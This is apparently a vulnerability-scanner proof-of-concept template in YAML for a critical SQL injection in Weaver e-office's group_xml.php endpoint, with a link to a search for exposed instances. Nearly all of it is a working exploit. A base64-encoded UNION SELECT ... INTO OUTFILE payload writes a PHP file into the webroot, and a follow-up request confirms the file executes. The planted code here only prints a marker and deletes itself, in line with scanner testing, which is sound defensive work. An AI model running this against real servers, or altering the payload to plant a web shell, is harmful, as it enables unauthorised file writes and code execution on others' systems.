name: poc-yaml-eweaver-eoffice-groupxml-sqli
binding: 8eb4dfd0-6004-41de-be30-816ce6e30adc
manual: true
detail:
    author: y0y0
    links:
        - https://mp.weixin.qq.com/s/yEPmYCYUr839Acm8-lqV9w
        - https://fofa.info/result?qbase64=YXBwPSLms5vlvq4tRU9mZmljZSI%3D
    vulnerability:
        level: critical
transport: http
set:
    rStr0: randomLowercase(8)
    rStr1: randomLowercase(8)
    payload: base64("[group]:[1]|[groupid]:[1 union select '<?php echo \\\"" + rStr0 + "\\\";unlink(__FILE__);?>',2,3,4,5,6,7,8 into outfile '../webroot/" + rStr1 + ".php']")
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /inc/group_user_list/group_xml.php?par={{payload}}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.startsWith("<?xml")
    r1:
        request:
            cache: true
            method: GET
            path: /{{rStr1}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(rStr0)
expression: r0() && r1()
